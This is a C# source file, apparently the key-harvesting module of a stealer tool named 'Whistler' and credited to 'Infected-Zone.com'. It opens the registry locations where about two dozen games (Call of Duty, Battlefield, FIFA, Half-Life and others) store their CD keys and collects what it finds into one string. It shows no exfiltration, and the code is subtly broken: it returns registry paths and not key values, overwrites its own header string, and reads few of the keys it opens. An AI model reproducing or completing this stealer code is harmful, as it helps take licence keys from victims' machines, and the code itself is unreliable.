using Microsoft.Win32;

namespace Whistler.Classes
{
    class classKeys
    {
        public static string gamekeys()//Infected-Zone.com
        {
            var key = Registry.LocalMachine;
            var key1 = Registry.CurrentUser;
            var cod1 = key.OpenSubKey("SOFTWARE\\ACTIVISION\\Call of Duty", false);
            var cod2 = key.OpenSubKey("SOFTWARE\\ACTIVISION\\Call of Duty 2", false);
            var cod4 = key.OpenSubKey("SOFTWARE\\ACTIVISION\\Call of Duty 4", false);
            var codWAW = key.OpenSubKey("SOFTWARE\\ACTIVISION\\Call of Duty WAW", false);
            var HL = key1.OpenSubKey("Software\\Valve\\Half-Life\\Settings", false);
            var CS = key1.OpenSubKey("Software\\Valve\\CounterStrike\\Settings", false);
            var Q3 = key.OpenSubKey("SOFTWARE\\id\\Quake III Arena\\InstallPath\\base", false);
            var D3 = key.OpenSubKey("SOFTWARE\\id\\Doom 3\\IntallPath\\base\\doomkey", false);
            var bf2 = key.OpenSubKey("SOFTWARE\\Electronic Arts\\EA Games\\Battlefield 2\\ergc", false);
            var bf1942 = key.OpenSubKey("SOFTWARE\\Electronic Arts\\EA GAMES\\Battlefield 1942\\ergc", false);
            var bf1942rtr = key.OpenSubKey("SOFTWARE\\Electronic Arts\\EA GAMES\\Battlefield 1942 The Road to Rome\\ergc", false);
            var ut2003 = key.OpenSubKey("SOFTWARE\\Unreal Technology\\Installed Apps\\UT2003", false);
            var pigi2 = key.OpenSubKey("IGI 2 Retail", false);
            var raven = key.OpenSubKey("SOFTWARE\\Red Storm Entertainment", false);
            var nfsu = key.OpenSubKey("SOFTWARE\\EA Games\\Need for Speed Undercover", false);
            var scpt = key.OpenSubKey("SOFTWARE\\Ubisoft\\Splinter Cell Pandora Tomorrow", false);
            var scct = key.OpenSubKey("SOFTWARE\\Ubisoft\\Splinter Cell Chaos Theory", false);
            var dow = key.OpenSubKey("SOFTWARE\\THQ\\Dawn of War", false);
            var fifa02 = key.OpenSubKey("SOFTWARE\\Electronic Arts\\EA Sports\\FIFA 2002", false);
            var mohaab = key.OpenSubKey("SOFTWARE\\Electronic Arts\\EA GAMES\\Medal of Honor Allied Assault Breakthrough\\ergc", false);
            var mohaa = key.OpenSubKey("Electronic Arts\\EA GAMES\\Medal of Honor Allied Assault\\egrc", false);
            var fifa03 = key.OpenSubKey("SOFTWARE\\Electronic Arts\\EA Sports\\FIFA 2003\\ergc", false);
            var fifa08 = key.OpenSubKey("SOFTWARE\\Electronic Arts\\EA Sports\\FIFA 2008\\ergc", false);
            var fifa09 = key.OpenSubKey("SOFTWARE\\Electronic Arts\\EA Sports\\FIFA 2009\\ergc", false);
            string cdkeys = "================================" ;
            cdkeys = "\n";
            if(codWAW != null) cdkeys += "codWAW=" + codWAW.ToString();
            if (cod4 != null) cdkeys += "COD4=" + cod4.ToString();
            if (scct != null) cdkeys += "scct=" + scct.ToString();
            if (ut2003 != null) cdkeys += "ut2003=" + ut2003.ToString();
            if (CS != null) cdkeys += "CS=" + CS.ToString();
            if (HL != null) cdkeys += "HL=" + HL.ToString();

            return cdkeys;
        }
    }
}
